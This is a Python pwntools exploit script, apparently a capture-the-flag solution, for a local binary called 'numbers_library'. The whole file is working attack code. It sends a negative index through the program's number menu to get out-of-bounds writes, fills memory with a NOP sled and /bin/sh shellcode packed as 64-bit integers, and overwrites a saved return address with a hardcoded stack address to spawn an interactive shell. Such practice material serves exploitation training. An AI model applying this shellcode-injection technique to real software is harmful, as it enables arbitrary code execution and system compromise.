#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./numbers_library
from pwn import *
from ctypes import *

context.terminal = ['gnome-terminal', '-e']
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./numbers_library')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

io.recvuntil("Exit")
io.sendline("1")
io.recvuntil("Tell me a number")
io.sendline("-1")
io.recv()
io.sendline("999")

shellcode = asm(shellcraft.sh()) #len 48
print(shellcode)
print(shellcraft.sh())

# Padding
for i in range(16):
    io.recvuntil("Exit")
    io.sendline("1")
    io.recv()
    io.sendline(str(i))
    nop_slide = asm("NOP; NOP; NOP; NOP; NOP; NOP; NOP; NOP")
    nop_slide_bytes = c_long(int.from_bytes(nop_slide, byteorder='little')).value

    io.sendline(str(nop_slide_bytes))

for i in range(len(shellcode)//8):
    io.recvuntil("Exit")
    io.sendline("1")
    io.recv()
    io.sendline(str(16+i))
    
    shellcode_part = shellcode[0+8*i:i*8+8]
    shellcode_int = int.from_bytes(shellcode_part, byteorder='little')

    print(shellcode_part)
    print(str(shellcode_int))
    
    if(shellcode_int > 0x7fffffffffffffff):
        shellcode_int = (c_long(shellcode_int)).value

    io.sendline(str(shellcode_int))

io.recvuntil("Exit")
io.sendline("1")
io.recv()
io.sendline(str("66")) #rbp + 1
io.sendline(str(0x00007fffffffe488))

io.sendline("-1")

io.interactive()

